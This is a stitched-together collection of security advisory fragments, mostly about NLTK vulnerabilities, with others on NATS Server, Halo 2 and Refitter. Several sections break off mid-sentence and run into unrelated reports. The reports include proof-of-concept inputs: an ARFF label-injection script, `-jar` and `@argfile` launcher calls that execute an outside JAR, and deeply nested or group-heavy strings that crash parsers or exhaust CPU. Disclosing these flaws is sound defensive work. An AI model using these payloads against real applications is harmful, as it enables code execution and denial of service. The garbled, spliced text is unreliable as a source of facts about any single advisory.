Disable remote `$ref` fetching by default (or allow-list); confine local `$ref` to the spec directory (reject absolute paths and `..`). Don't `file_get_contents($ref)` on attacker-controlled URIs.

### Summary

Refitter emits the spec's content-type key (content map key in requestBody/responses) verbatim into a Refit `[Headers("Accept: <ct>", "Content-Type: <ct>")]` attribute string without escaping
`"`. A crafted value survives Refitter's default OpenAPI validation, breaks out of the attribute and

### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server can accept client connections over WebSocket and can also support MQTT over WebSocket when MQTT is configured.

### Problem Description

A WebSocket listener could route requests for the MQTT-over-WebSocket path into MQTT handling even when MQTT was not configured.

On affected deployments, an unauthenticated client with access to the WebSocket listener could reach uninitialized MQTT state and crash the server process.

This affects deployments that enable WebSocket while leaving MQTT disabled. Deployments where MQTT is intentionally configured initialize the MQTT state and are not affected in the same way.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

Deployments not using WebSocket are not affected. Deployments using both WebSockets and MQTT are not affected. No known workaround for deployments that need WebSocket without MQTT-over-WebSocket. Upgrade to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p957-7v2w-g93g>
 * Credit: Vasco Franco, Trail of Bits

### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server MQTT support includes retained messages and QoS1+ durable delivery. NATS subscription permissions can allow broad wildcard subscriptions while denying more sensitive subjects.

### Problem Description

MQTT retained message delivery and QoS1+ durable replay could deliver messages whose original topics matched a subscriber's configured subscribe deny rules.

Normal live delivery applied the delivery-time deny check. These MQTT delivery paths did not consistently recheck the concrete original topic before sending the MQTT `PUBLISH` to the subscriber.

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Summary
The Halo 2 aggregation circuit could mishandle proof elements encoded as the point at infinity.

When an assigned proof point appeared in an MSM term with constant scalar one, the Halo 2 loader used a scalar-one shortcut that passed the assigned point directly into the EC sum helper. The EC sum implementation used by that path assumed its inputs were non-identity points, while assigned proof points could represent the encoded identity `(0, 0)`.

### Details
`EcPointLoader::multi_scalar_multiplication` partitions MSM terms by scalar and base type. For `(Value::Constant(ONE), Value::Assigned(_))`, the loader placed the assigned base into the non-scaled variable-base list and later passed those points to `sum_with_const`.

The default Halo 2 shim delegates `sum_with_const` to halo2-lib `EccChip::sum`. In affected versions, that sum helper used incomplete affine addition and assumed that every input point was non-identity. A prover-controlled proof point encoded as `(0, 0)` could therefore enter the final aggregation sum through the scalar-one shortcut and affect the MSM or accumulator computation.

The issue was fixed in halo2-lib by updating `EccChip::sum` to treat encoded identity inputs as no-ops and to return `(0, 0)` when the total sum is the identity. This removes the non-identity input precondition from callers such as the Halo 2 aggregation loader.

### Impact
Recursive aggregation circuits using the Halo 2 loader could compute an MSM or accumulator with an identity proof element in a path whose implementation assumed non-identity inputs. This breaks the expected handling of point-at-infinity proof elements in aggregation.

Practical exploitability depends on the surrounding aggregation and final-decider checks, so this is rated medium severity.

## Summary

NLTK ships a security wrapper, `nltk.pathsec.ZipFile`, that is meant to confine archive extraction to trusted data roots and to block link-based escapes. When `nltk.download()` installs a package, the extraction write opens each member's target path without checking whether that path is a hardlink to a file located outside the data root. A local actor who can write inside a shared or predictable NLTK data root (for example `~/nltk_data`, a group-writable `/usr/share/nltk_data`, or a shared container volume) can pre-plant an in-root hardlink at a member path that a soon-to-be-installed package will write. When the victim later runs the download, extraction truncates and overwrites the outside-root target through that hardlink. This is the same weakness class as the previously fixed downloader hardlink issue, but the fix did not reach the package-extraction write sink, so the latest published release remains exploitable through this path.

The prior fix added an `st_nlink > 1` refusal to the file-open helpers (`nltk.pathsec.open` / `_hardened_open`) and routed the downloader temporary-file write through that hardened opener, so a multiply-linked inode is refused on those paths. The extraction write sink was never given the same check. On published releases, `nltk.pathsec.ZipFile.extract` validates member names with `validate_zip_archive` and then delegates to the standard library extractor, whose plain `open(targetpath, "wb")` opens and truncates a pre-existing hardlink. No code on the extraction path performs the `st_nlink` fstat that the sibling open helper performs.

### Summary

`nltk.picklesec.allowlisted_pickle_load` keyed its denylist of dangerous globals by export name, so numpy's file-I/O callables that live in submodules and are not re-exported under `__module__ == "numpy"` were never matched. nltk >= 3.10.0 and <= 3.10.3 (the allowlisting unpickler and the `TransitionParser` model path); numpy must be installed.

File read and file create on the host that loads an untrusted model through NLTK's allowlisting unpickler. No code execution: this sits below the `TransitionParser` code-execution sibling GHSA-m396-3h67-vpfv, which is why the severity was reassessed to Medium (see the reply below).

> **dynamically reproduced**: `nltk` `3.9.4` (8/9, scoped-escape checks), `3.10.3` (wheel, 9/9 checks) and `master` `6818767b9` (9/9 checks)

---

_Source references (`file:line`) are to commit `303f6e2b` (release tag `v3.10.3`). Line numbers in the released `nltk` wheel match this tag exactly; `master` `6818767b9` contains the same code (pathsec.py renumbered by +44 lines from added hardening comments). In `3.9.4` the same logic exists at earlier line numbers (`api.py:222-236` for `open()`, `api.py:161-203` for `abspath()`/`abspaths()`, `data.py:382-388` for the pointer open, `pathsec.py:105-114` for the scoped branch); the affected code is identical._

### Summary

`CorpusReader.open()` (`nltk/corpus/reader/api.py:235-257`) is NLTK's hardened file-access entry point: after a lexical guard it calls `validate_path(..., required_root=self._root)` (`api.py:246-249`), and the scoped branch of `pathsec.validate_path` (`nltk/pathsec.py:168-179`) resolves symlinks and raises `ValueError` when the resolved target is not inside the corpus root. The view methods do **not** use this entry point: `PlaintextCorpusReader.words/sents/paras` (`nltk/corpus/reader/plaintext.py:67-118`) and `SyntaxCorpusReader.parsed_sents/tagged_sents/sents/tagged_words/words` (`api.py:473-519`) build their streams from `self.abspaths(fileids, ...)` (`api.py:174-217`), which only does a lexical `self._root.join(fileid)` (`nltk/data.py:452-469`) and returns a `FileSystemPathPointer`. That pointer is opened via `FileSystemPathPointer.open()` → `pathsec.open(raw_path, "rb")` with `required_root` left at its default `None` (`data.py:438-447`, `nltk/pathsec.py:752,783`), so only the **global** allowed-roots check runs. The `O_NOFOLLOW` in `_hardened_open` (`pathsec.py:676-731`) protects only the final path component, so an **intermediate-directory symlink inside the corpus root** pointing at a sibling allowed root is followed by the kernel. **A caller who places such a symlink (or loads an untrusted corpus containing one) can read any file that `open()` would refuse — files outside the corpus root yet inside the global NLTK data sandbox — via `PlaintextCorpusReader.words([...])` / `SyntaxCorpusReader.words([...])` (and the `abspaths()`-returned pointer), defeating the scoped escape protection that GHSA-p4rw-class fixes and `test_required_root_blocks_symlink_escape` were added for.**

### Details

Root cause: two sibling file-access channels on the same `CorpusReader` disagree about the scoped sandbox.

1. `CorpusReader.open()` (`api.py:235-257`) — the guarded channel:
   - Layer 1 lexical guard (`api.py:240-242`) rejects absolute paths and `..`.
   - Layer 2 scoped guard (`api.py:246-249`) calls `pathsec.validate_path(path, context="CorpusReader", required_root=self._root)`.
   - The `required_root` branch (`pathsec.py:168-179`) resolves the target with `Path(raw).resolve()` and raises `ValueError` when `target.is_relative_to(scoped_root)` is false.

2. The view-method channel — `abspaths()` → `FileSystemPathPointer` → `pathsec.open(required_root=None)`:
   - `CorpusReader.abspath()` (`api.py:174-183`) and `abspaths()` (`api.py:185-217`) return `self._root.join(f)` with **no** `validate_path` call.
   - `FileSystemPathPointer.join()` (`data.py:452-469`) only normalizes lexically (`normpath` + root-prefix `startswith`); it never calls `os.path.realpath`/`Path.resolve`, so the intermediate symlink is preserved verbatim.
   - `FileSystemPathPointer.open()` (`data.py:438-447`) calls `_secure_open(self._path, "rb")` (aliased from `pathsec.open`) with no `required_root`, so `pathsec.open` (`pathsec.py:752`) uses its default `required_root=None` and `validate_path` (`pathsec.py:783`) runs only the global allowed-roots check (`pathsec.py:181-207`).
   - Under `ENFORCE=True` + POSIX, `_hardened_open` (`pathsec.py:676-731`) opens

## Summary

NLTK 3.10.3 contains security hardening intended to close JVM argument-injection and untrusted JAR/classpath execution paths in `nltk.internals.java()`, including the issue published as GHSA-m4rf-3fr8-xwx3.

The patched `options` channel correctly rejects Java argument-file references such as `@/path/to/args` and launcher modes such as `-jar`. However, an additional argument channel remains: the caller-provided `cmd` sequence is appended to the Java command after the validated option and classpath channels, without enforcing that its first item is a Java main-class name.

I am reporting this as an additional post-fix bypass / incomplete-fix path affecting the 3.10.3 remediation, rather than as an unrelated vulnerability family.

As a result, the same launcher token that is rejected through `options` can be supplied as the first `cmd` item. I confirmed two reachable forms against the official `nltk-3.10.3-py3-none-any.whl`:

1. direct use of the public `nltk.internals.java()` helper with `cmd=["-jar", ...]`; and
2. the higher-level `StanfordSegmenter`, whose public `java_class` constructor argument becomes the first `cmd` item and accepts an `@argfile` launcher token.

Both paths execute an external researcher-controlled JAR without setting `NLTK_ALLOW_UNSAFE_JARS`, `NLTK_ALLOW_UNSAFE_CLASSPATH`, or using `trusted_raw_options`. The original explicit outside-classpath route is blocked in 3.10.3, while the alternate command channel executes the JAR 3/3 times.

## Affected artifact

```text
Package: nltk
Confirmed affected version: 3.10.3
Wheel: nltk-3.10.3-py3-none-any.whl
SHA-256: ff9598a8e20518ee0d557745890cc4435b9578489e2dcbc69c4f81fa060caf7c
```

Baseline artifact:

```text
Version: 3.10.2
Wheel: nltk-3.10.2-py3-none-any.whl
SHA-256: 2c7ccacb765c5e26b0cb60fb1b57080af522c6924d12a714a243305ba3637412
```

## Relationship to the 3.10.3 security fixes

The existing 3.10.3 hardening validates the dedicated per-call `options` list before it reaches `subprocess.Popen`. In particular, the exact `@argfile` token used in this report is rejected through `options` with a `ValueError` that references CVE-2026-12841 and CWE-88.

The command is subsequently assembled in this order:

```python
final_cmd.extend(validated_options)
if classpath_arg is not None:
    final_cmd.extend(["-cp", classpath_arg])
final_cmd.extend(cmd_list)
```

`cmd_list` is copied from the public `cmd` argument but its first token is not checked to ensure that it is an ordinary Java main class. Java therefore interprets leading `-jar`, `@argfile`, module-mode, or classpath-mode tokens as launcher control arguments rather than application arguments.

This is an alternate argument channel around the same JVM argument/JAR execution boundary protected by the 3.10.3 changes.

## Confirmed API paths

### Direct public helper

```python
nltk.internals.java(
    ["-jar", "/outside/trusted/roots/controlled.jar"],
    classpath=None,
    stdout="pipe",
    stderr="pipe",
)
```

The external JAR executed in all three subject runs.

### Higher-level `StanfordSegmenter` path

`StanfordSegmenter` exposes a public `java_class` constructor argument, stores it, and later places it at the beginning of the `cmd` sequence passed to `nltk.internals.java()`.

A controlled argument file containing a `-jar` launcher invocation was supplied as:

```python
StanfordSegmenter(
    path_to_jar=trusted_segmenter_jar,
    java_class="@/path/to/controlled-launcher.args",
    path_to_model="dummy-model",
    java_options=[],
)
```

The trusted segmenter JAR passed the wrapper's checksum and classpath checks. The `@argfile` then switched the Java launcher to the external JAR, which executed in all three runs.

The deprecated wrapper subsequently raised an unrelated post-launch `AttributeError` while processing its output. The external marker had already been written by the child JVM before that exception.

> **dynamically reproduced**: `3.6` (6/6 checks), `3.9.2` (6/6), `3.10.3` (6/6) and `develop` `6818767b9` (6/6)

---

_Source references (`nltk/corpus/reader/xmldocs.py:NNN`) are to commit `6818767b99c24659107eb2be9bccd32a3d4bf045` (`develop`, `v3.10.3-15-g6818767b9`). The released `v3.10.3` wheel's `xmldocs.py` is byte-identical to that commit, so the same line numbers apply to the released wheel._

### Summary

**An attacker who can make a victim read a well-formed XML corpus file whose body contains one large comment or CDATA section can pin a CPU core for a time quadratic in the file size, because `XMLCorpusView._read_xml_fragment` (`nltk/corpus/reader/xmldocs.py`) re-runs a linear whole-buffer validation after every 1 KiB block while the comment/CDATA terminator is still ahead.** `XMLCorpusView` is NLTK's documented streaming API for XML corpora and is instantiated directly by the `NPSChatCorpusReader` and `FramenetCorpusReader` readers; the module header (`xmldocs.py:16-20`) explicitly handles untrusted corpus XML. The `in_tag` guard added to this function for GHSA-vp2x covers only a single oversized `<...>` tag and leaves the CDATA/comment path quadratic in the current release.

### Details

Root cause: `_read_xml_fragment` (`xmldocs.py:273-338`) accumulates the file into one `fragment` string in `_BLOCK_SIZE` (1024) character chunks (`xmldocs.py:123, 298-299`). After every block that is not yet a well-formed prefix, the fragment is re-validated against `_VALID_XML_RE`. Two whole-buffer operations dominate:

```python
# xmldocs.py:308
if not in_tag and self._VALID_XML_RE.match(fragment):      # whole-buffer match (O(len))
    return fragment
# xmldocs.py:312
if re.search("[<>]", fragment).group(0) == ">":            # O(1) for this input class:
    ...                                                     # the document starts with '<'
# xmldocs.py:329
if self._VALID_XML_RE.match(fragment[:last_open_bracket]): # whole-buffer prefix match (O(len))
    ...
```

For this input class the `re.search` probe at `xmldocs.py:312` is O(1): the fragment always starts with `<` (e.g. `<root>…`), so the first `<`/`>` character is at offset 0 and it never contributes cost. The quadratic cost comes entirely from the two whole-buffer regex matches at `xmldocs.py:308` and `xmldocs.py:329` (the latter scans the buffer up to the most recent `<`, which for this input sits near the end of the buffer).

`_VALID_XML_RE` (`xmldocs.py:238-249`) is a *linear* regex (its tempered-dot comment/CDATA bodies `(?:(?!-->).)*` / `(?:(?!\]\]>).)*` scan left-to-right in O(length) — confirmed by the embedded script's single-match check), but for a fragment whose terminator is far ahead the *match itself fails after scanning the whole buffer*. With an unclosed-across-blocks CDATA or comment, **every one of the n/1024 blocks** pays O(current buffer length) on lines 308 and 329, for a total of ~O(n²) character operations.

The `in_tag` guard added for GHSA-vp2x (`xmldocs.py:283-305`) tracks only bare `<`/`>` characters: it is `True` inside an unclosed `<...>` tag and, in that state, skips only the line-308 match. It never represents "the fragment sits inside an unclosed CDATA or comment" — XML allows arbitrary `<`/`>` inside those constructs — so both the line-308 match and the line-329 backtrack match still fire on every block for a CDATA/comment fragment. The comment block at `xmldocs.py:283-289` even documents the intended linearity contract ("re-running it on every 1 KiB block otherwise makes a single oversized tag O(n^2) (CWE-407)"); the guard implements it for the tag branch only.

The single-match cost is linear, not super-linear: the embedded script measures `_VALID_XML_RE.match()` on 512 KiB → 1 MiB → 2 MiB unclosed-CDATA buffers and gets ≈ 0.074 s → 0.142 s → 0.280 s (≈ 1:1.9:3.8, i.e. linear), asserting

> **affected**: PyPI `nltk` `>= 3.6.7` — `nltk.downloader` index parsing (`Downloader._update_index`)
> **dynamically reproduced**: `nltk` `3.6.7` (4/4 checks), `3.9.2` (4/4), `3.10.3` (4/4), and `develop` `6818767b9` (4/4)

---

_Source references (`nltk/downloader.py:NNN`) are to commit `6818767b9` (`develop`, `v3.10.3-15-g6818767b9`). The `v3.10.3` tag and the released `3.10.3` wheel carry the identical code at the identical line numbers (the vulnerable closure BFS sits at `downloader.py:1300-1310`). Dynamically verified wheels additionally show the same defect at `downloader.py:972` (`3.9.2`) and `downloader.py:987` (`3.6.7`)._

### Summary

`Downloader._update_index` (`nltk/downloader.py:1253-1313`) is the mandatory first step of every downloader operation (`download()`, `info()`, `packages()`, `collections()`, `list()`, `status()`). After replacing each `<item ref="…">` string with the actual `Collection`/`Package` object (`downloader.py:1285-1290`), it computes each collection's recursive package closure with a breadth-first walk that has **no visited set and no depth cap**:

```python
# nltk/downloader.py:1300-1310
for collection in self._collections.values():
    packages = {}
    queue = [collection]
    for child in queue:
        if isinstance(child, Collection):
            queue.extend(child.children)
        elif isinstance(child, Package):
            packages[child.id] = child
    collection.packages = packages.values()
```

**A self-referencing or mutually-referencing index — e.g. `<collection id="a"><item ref="a"/></collection>` — turns `a.children` into an object-level cycle, and the `for child in queue: queue.extend(child.children)` loop appends to the very list it is iterating, so the queue grows forever.** The function never returns: CPU spins at 100% and memory grows without bound until the process is killed or the host runs out of memory. The identical finite input (one collection containing one package) completes in ~0.2 s on the control index, so the input is perfectly ordinary in size — only its self-reference is abnormal, and nothing validates it.

### Details

Root cause is the combination of three unguarded steps:

1. `Collection.fromxml` (`nltk/downloader.py:362-369`) stores each `<item ref="…">` attribute verbatim as a string. It never checks whether a ref targets the collection's own id, or participates in a reference cycle.
2. `_update_index` (`nltk/downloader.py:1285-1290`) replaces those ref strings with the live objects from `self._collections` / `self._packages`. A self- or mutual-reference therefore becomes an object-level cycle in `children`.
3. The closure walk (`nltk/downloader.py:1300-1310`) iterates `for child in queue` while doing `queue.extend(child.children)` inside the loop. Python's list iterator consumes elements appended during iteration, so with a cycle the iterator and the queue length advance in lockstep forever. There is no `visited` set, no node-count cap, and no cycle detection.

The input is the data-server index that the downloader is designed to fetch and trust: `_update_index` pulls it with `safe_parse(urlopen(self._url))` (`nltk/downloader.py:1269-1271`) and parses `<collections>/<collection>` elements with no structural validation. The index URL is a user-configurable product feature (`server_index_url` constructor argument, CLI `-u` / `--url` at `downloader.py:3052-3058` — the option's `dest` is `server_index_url` — plus `NLTK_DOWNLOAD_URL` and the Shell/GUI "Set Server URL"), so an operator who uses a third-party mirror, or whose configured mirror is compromised, delivers the malicious index into exactly this code path on the next download or query.

The self-checking reproduction script embedded below runs the attack against a `file://`-hosted index (no network server needed; the hardened `nltk.pathsec.urlopen` accepts local `file://` URLs) and a matching acyclic control index, in **separate child processes under an address-space cap (`RLIMIT_AS`)**. ## Description

### Summary

`nltk.classify.weka.ARFF_Formatter` writes class labels directly into the Weka ARFF `@ATTRIBUTE '-label-' {...}` declaration without any ARFF quoting or escaping. An attacker who can contribute class labels to a training dataset can include ARFF metacharacters such as `}`, newlines, `@ATTRIBUTE`, and `@DATA` to break out of the nominal label list and inject attacker‑controlled ARFF schema and data directives.

This vulnerability is reachable in any application that calls `WekaClassifier.train()` or `ARFF_Formatter.from_train()` with attacker‑influenced training data. The victim does not need to manually edit the ARFF file; the normal training workflow writes the malformed ARFF automatically.

### Technical Details

The vulnerable code path is:

1. `WekaClassifier.train()` calls `ARFF_Formatter.from_train(featuresets)`.
2. `from_train()` extracts labels from the training data and passes them to `ARFF_Formatter(labels, features)`.
3. `header_section()` uses `",".join(self._labels)` directly, embedding attacker‑controlled strings into the ARFF header without sanitization.

Because the label names are not escaped, a label containing `safe}\n@ATTRIBUTE injected NUMERIC\n@DATA\n0,owned\n%` will close the label set, inject a new attribute, start a premature data section, and comment out the remaining header.

### Proof of Concept

The following self‑contained Python script demonstrates the vulnerability. It requires only NLTK and does **not** need Weka to be installed, because the attack is carried out purely by generating the ARFF string.

```python
from nltk.classify.weka import ARFF_Formatter

# Attacker‑controlled label containing ARFF metacharacters.
# The `}` closes the label set, the `@ATTRIBUTE` injects a new attribute,
# `@DATA` starts the data section early, and `%` comments out the rest.
malicious_label = "safe}\n@ATTRIBUTE injected NUMERIC\n@DATA\n0,owned\n%"

featuresets = [
    ({"f": "benign"}, "legit"),          # legitimate example
    ({"f": "payload"}, malicious_label), # attacker's example
]

# NLTK builds the formatter from the training data
formatter = ARFF_Formatter.from_train(featuresets)

# Generate the ARFF string – this is what would be written to the training file
arff = formatter.format(featuresets)

# Verify that the injection succeeded
assert "@ATTRIBUTE injected NUMERIC" in arff, "Injected attribute not found"
assert "@DATA\n0,owned" in arff, "Injected data row not found"

print("=== Injected ARFF (excerpt) ===")
for line in arff.splitlines()[5:12]:
    print(line)
```

Expected output:

```
=== Injected ARFF (excerpt) ===
@ATTRIBUTE 'f' STRING
@ATTRIBUTE '-label-' {legit,safe}
@ATTRIBUTE injected NUMERIC
@DATA
0,owned
%
```

Explanation of the injection:

· The label safe} closes the nominal label set {legit,safe} prematurely.
· The following lines (@ATTRIBUTE injected NUMERIC, @DATA, 0,owned) are then parsed as legitimate ARFF directives, not as part of the label name.
· The % at the end comments out the remaining header lines that NLTK would have appended, preventing syntax errors.

References

· CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component
· Huntr report  https://huntr.com/bounties/bc7085e7-1caf-40c7-b406-a5099ce44072
· Weka ARFF format documentation

### Summary
The recursive traversal engines behind WordNetCorpusReader's Synset.tree() and Synset.acyclic_tree() have no maximum call-depth safeguard and default to unlimited depth. They guard against literal cycles, but not against a long, genuinely acyclic relation chain — which exhausts the Python call stack the same way as the sibling DependencyGraph finding I reported separately. Real-world exploitability requires the host application to load a custom/foreign WordNet-format lexical resource rather than NLTK's bundled default corpus — flagging that narrower scope honestly up front since it affects severity, not validity.

`nltk/util.py`'s `acyclic_depth_first()` (~lines 471-541) and `acyclic_branches_depth_first()` (~lines 544-625) recurse once per graph edge, default to `depth=-1` ("unlimited"), and guard against re-visiting the same node via an explicit `traversed` set (hence "acyclic") — but that set only prevents literal cycles, it never bounds how many *distinct* nodes a single call chain may pass through before returning.

## Root Cause
The CCG lexicon parser recurses on nested parenthesised categories without any depth
bound. `matchBrackets` (`nltk/ccg/lexicon.py:154`) calls itself once per nested `(`, and
`augParseCategory` (`nltk/ccg/lexicon.py:228,242`) recurses once per bracketed
sub-category. Neither function tracks recursion depth nor checks
`sys.getrecursionlimit()`, and the public entry point `fromstring`
(`nltk/ccg/lexicon.py:252`, also re-exported via `nltk.ccg.chart.fromstring`) applies no
length or nesting cap before handing the text to the parser.

## Impact
An application that parses an untrusted lexicon string aborts with an unhandled
`RecursionError`, terminating the affected parse operation or request worker
(denial of service, CWE-674). The recursion is pure Python, so CPython raises a catchable
`RecursionError` rather than crashing the process; there is no memory-corruption or
code-execution primitive. Confidentiality and integrity are unaffected. Plausibly, a
service that does not wrap the parse in a handler will surface the error to the caller and
drop the in-flight request.

## Attack Chain
1. The application calls `nltk.ccg.lexicon.fromstring(lex_str)` with attacker-supplied
   text such as `":- S\nw => " + "(" * 2000 + "S" + ")" * 2000 + "\n"`.
2. `fromstring` splits the input into lines; `LEX_RE`/`RHS_RE`
   (`nltk/ccg/lexicon.py:275-276`) match and route the parenthesised category into
   `augParseCategory` (`nltk/ccg/lexicon.py:277`) with no depth or length guard.
3. Because the category starts with `(`, `nextCategory` dispatches to `matchBrackets`,
   which recurses once per nested `(`; `augParseCategory` recurses once per bracketed
   sub-category. Each nesting level consumes call-stack frames.
4. Once the depth exceeds the interpreter recursion limit, an unhandled `RecursionError`
   propagates out of the public API and aborts the parse.

## Bypass Evidence
Running the dependency-free `matchBrackets` body verbatim from the shipped source at the
default recursion limit (1000): a well-formed balanced input at depth 5 and 500 parses
cleanly, while depth 2000 and 5000 raise an unhandled `RecursionError`. Because shallow,
balanced input parses without error, the failure is depth-driven rather than a generic
parse error. The crash triggers near ~1000 nesting levels at the default limit, so the
payload need not be extreme. A repository-wide search confirms no depth/recursion guard
exists anywhere under `nltk/ccg/` (the only recent change to this file routed regexes
through `nltk.redos` and added no recursion bound).

## Suggested Fix
Add a recursion-depth choke point on the lexicon-parsing path — for example a depth
counter that raises a bounded `ValueError` past a configurable maximum, mirroring the
existing guards on `FeatStructReader` (`nltk/featstruct.py`), `Tree.fromstring`
(`MAX_TREE_DEPTH`, `nltk/tree/tree.py`), and `LogicParser` (`MAX_PARSE_DEPTH`,
`nltk/sem/logic.py`).

Reported by pi (GitHub: @manus-pi).

## Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3885 "Bound recursion depth in parsers and traversal helpers" (ekaf), merged 2026-09-11, merge commit e521ecafc on develop.

## Root Cause
The dependency-graph traversal helpers recurse over dependency links without any depth
bound or visited set. `DependencyGraph._tree` (`nltk/parse/dependencygraph.py:404`)
recurses once per dependency link, `triples` (`nltk/parse/dependencygraph.py:432`) is a
recursive generator, and `get_cycle_path` (`nltk/parse/dependencygraph.py:520`) recurses
over dependencies. The neighbouring `contains_cycle` method was deliberately rewritten as
an iterative depth-first search, but these sibling helpers on the public traversal path
were left recursive with no depth counter.

## Impact
An application that parses an untrusted CoNLL/Malt-TAB dependency structure and then walks
it via `tree()` or `triples()` aborts with an unhandled `RecursionError`, terminating the
affected operation or request worker (denial of service, CWE-674). The recursion is pure
Python, so the result is a catchable `RecursionError`, not memory corruption or code
execution. Confidentiality and integrity are unaffected. `get_cycle_path` additionally
lacks a visited set and will not terminate on a genuine cycle.

## Attack Chain
1. The application constructs `DependencyGraph(conll_str)` from attacker-supplied text
   where token *k*'s head is token *k+1*, forming a linear dependency chain of length *N*.
   Graph construction (`_parse`) is iterative and completes without error.
2. The application calls the public `DependencyGraph.tree()`
   (`nltk/parse/dependencygraph.py:408`), which invokes `_tree(root)`.
3. `_tree` recurses once per chain link with no depth guard and no visited set, consuming
   one stack frame per link (the list comprehension costs roughly two frames per level).
4. Once the chain length exceeds the interpreter recursion limit, an unhandled
   `RecursionError` propagates out of the public API. `triples()` fails the same way.

## Bypass Evidence
Against the shipped source at the default recursion limit, a chain of length 5 walks
cleanly through `tree()`, while a chain of length 5000 raises an unhandled
`RecursionError`; `triples()` fails identically. The minimal trigger is roughly *N*=500
tokens at the default recursion limit — a modest, realistic parse. Because the graph
builds iteratively in both cases, the fault is isolated to the recursive traversal rather
than to parsing. A repository-wide search confirms no depth guard exists in this file; the
iterative rewrite was applied only to `contains_cycle`.

## Suggested Fix
Convert `_tree`, `triples`, and `get_cycle_path` to iterative traversals, or add a
recursion-depth bound (and, for `get_cycle_path`, a visited set) analogous to the
iterative rewrite already applied to `contains_cycle`.

`Type.fromstring` classmethod and by signature-string type checking.

an attacker-influenced signature, aborts with an unhandled `RecursionError`, terminating
the affected operation or request worker (denial of service, CWE-674). The recursion is
pure Python, yielding a catchable `RecursionError` rather than memory corruption or code

general-purpose parser because the input must reach a type-string or signature parameter.

## Root Cause
`Tree.fromlist` (`nltk/tree/tree.py:767`) converts a nested list into a `Tree` by recursing
once per nesting level (`nltk/tree/tree.py:780`) with no depth bound — its only validation
is `type(l) == list and len(l) > 0`. The sibling constructor `Tree.fromstring` was hardened
with a `MAX_TREE_DEPTH` cap (`nltk/tree/tree.py:31,695`) that rejects adversarially deep
input with a bounded `ValueError`, but that guard was not applied to `fromlist`, which
builds `Tree` objects identically.

## Impact
An application that builds a `Tree` from an attacker-controlled nested list — for example
`Tree.fromlist(json.loads(untrusted))` — aborts with an unhandled `RecursionError`,
terminating the affected operation or request worker (denial of service, CWE-674). Any
later recursive traversal of an over-deep tree (`height`, `pformat`, equality) fails the
same way. The recursion is pure Python, yielding a catchable `RecursionError` rather than
memory corruption or code execution. Confidentiality and integrity are unaffected.

## Attack Chain
1. The application obtains an attacker-controlled deeply nested list, typically by decoding
   an untrusted JSON payload, and calls `nltk.tree.Tree.fromlist(l)`.
2. `fromlist` checks only that the argument is a non-empty list; it applies no depth cap.
3. `fromlist` recurses once per nesting level, consuming call-stack frames; the
   `MAX_TREE_DEPTH` guard used by `fromstring` is never invoked on this path.

cleanly while depth 5000 raises an unhandled `RecursionError`. The realistic JSON-delivery
objection does not hold: CPython's C JSON decoder tolerates far deeper nesting than the
pure-Python `fromlist` recursion, so there is a wide window (measured from roughly depth 500
up to ~1500 at the default limit) in which `json.loads` succeeds and `fromlist` is the
component that raises. Notably the `fromlist` crash threshold (~500) coincides with the

string path is left unbounded on the list path.

Apply the existing `MAX_TREE_DEPTH` bound (or an equivalent depth counter) inside

## Summary

NLTK exposes a compile-time regular-expression denial of service in its regex-search helpers. When an application passes untrusted text as the search pattern to `TokenSearcher.findall()` / `Text.findall()`, or as the tokenizer pattern to `RegexpTokenizer`, the pattern is handed to the third-party `regex` engine, whose compilation cost is roughly quadratic in the number of capturing groups. A short pattern of the form `()` repeated many times (for example `"()" * 25000`, about 50 KB) forces tens of seconds of synchronous CPU work before any match begins. The wall-clock timeout that NLTK added to guard matching does not apply during compilation, so a single small request pins a CPU core, and repeated or concurrent requests exhaust all cores and deny service.

## Root Cause

The remediation for the earlier match-time backtracking issue (advisory GHSA-rrv8-h7p8-rx55 / CVE-2026-80205) switched the caller-supplied-pattern search path from the standard library `re` module to the third-party `regex` engine and wrapped matching in a wall-clock timeout. That timeout is a match-time limit only: it is applied while the compiled pattern scans the corpus. Compilation of the pattern happens first and synchronously, outside any timeout. The `regex` engine's compiler is approximately O(n^2) in the number of regex groups, so a caller-controlled pattern consisting of many empty groups makes compilation, not matching, the expensive step. No control bounds the group count of a caller-supplied pattern before compilation.

```text
Affected components / functions:
- nltk.text.TokenSearcher.findall  (nltk/text.py)  -> regex.findall(pattern, corpus, timeout=...)
    On released 3.10.0-3.10.2 this sink calls regex.findall directly; on 3.10.3 and later it
    routes through nltk.redos.compile. Either way the regex engine compiles the caller pattern
    with no group-count bound, and the timeout guards only matching.
- nltk.redos.compile  (nltk/redos.py, introduced in 3.10.3)  -> regex.compile(src, flags)
    Called synchronously before the timeout-bearing wrapper exists. On released 3.10.3 there is
    no pre-compile guard at all; on the current development tree a check_pattern bounds source
    length, nesting depth, and counted-repeat product, but not the number of groups.
```

## Impact

An unauthenticated attacker who can influence a regular-expression string that reaches one of these NLTK search or tokenizer entry points can force amplified CPU consumption. Four hypernym-walking methods on the WordNet `Synset` class in `nltk/corpus/reader/wordnet.py` (`max_depth`, `min_depth`, `hypernym_paths`, and `hypernym_distances`) traverse the hypernym pointer graph by direct recursion with no visited-node set and no depth cap. When the parsed hypernym graph contains a cycle, or a chain deeper than the interpreter recursion limit, these methods recurse without bound and raise an uncaught `RecursionError`, aborting the traversal and any worker that does not catch it. ## Summary

`SeekableUnicodeStreamReader.readline` in `nltk/data.py` assembles a line by repeatedly reading a block, appending it to a growing `chars` buffer, and recomputing `chars.splitlines(True)` over the entire buffer on every loop iteration. The read block size doubles only until it caps at 8000 characters, so for a single unterminated line of N characters the loop runs about N/8000 iterations and iteration k re-scans roughly 8000*k characters, giving O(N^2) total work. The default `size=None` used on the line-oriented corpus-reader read path means the early break never fires before end of file. An attacker who supplies a corpus file containing one very long line with no newline can force quadratic CPU consumption in the reader's process. This is the same growing-buffer re-scan algorithmic-complexity class the project already treats as advisory-worthy in sibling corpus readers.

## Root Cause

